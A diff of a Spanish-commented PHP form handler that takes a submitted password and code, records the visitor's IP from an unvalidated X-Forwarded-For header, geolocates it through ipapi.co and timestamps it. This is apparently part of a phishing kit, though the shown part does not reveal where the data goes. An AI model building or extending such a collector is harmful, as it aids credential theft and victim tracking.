@@ -8,30 +8,33 @@ $clave   = $_POST['clave'] ?? '';
 $codigo  = $_POST['codigo'] ?? '';
 
 // 🌐 IP REAL
-function getIP(){
-    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
-        foreach ($ips as $ip) {
-            $ip = trim($ip);
-            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
-                return $ip;
-            }
-        }
-    }
+// 🌐 IP REAL (CORREGIDO PARA HEROKU)
+$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
 
-    if (!empty($_SERVER['REMOTE_ADDR'])) {
-        return $_SERVER['REMOTE_ADDR'];
-    }
-
-    return 'UNKNOWN';
+// limpiar múltiples IP
+if(strpos($ip, ',') !== false){
+    $ip = explode(',', $ip)[0];
 }
 
-$ip = getIP();
-// 🌍 GEOLOCALIZACIÓN
-$geo = @json_decode(file_get_contents("http://ipapi.co/$ip/json/"));
+$ip = trim($ip);
 
-$pais = ($geo && $geo->status == "success") ? $geo->country : "Desconocido";
-$ciudad = ($geo && $geo->status == "success") ? $geo->city : "Desconocido";
+// 🌍 GEOLOCALIZACIÓN CORRECTA
+$pais = "Desconocido";
+$ciudad = "Desconocido";
+
+$geoData = @file_get_contents("http://ipapi.co/".$ip."/json/");
+
+if($geoData){
+    $geo = json_decode($geoData);
+
+    if(isset($geo->country_name)){
+        $pais = $geo->country_name;
+    }
+
+    if(isset($geo->city)){
+        $ciudad = $geo->city;
+    }
+}
 // 🕒 HORA
 $fecha = date("Y-m-d H:i:s");
 
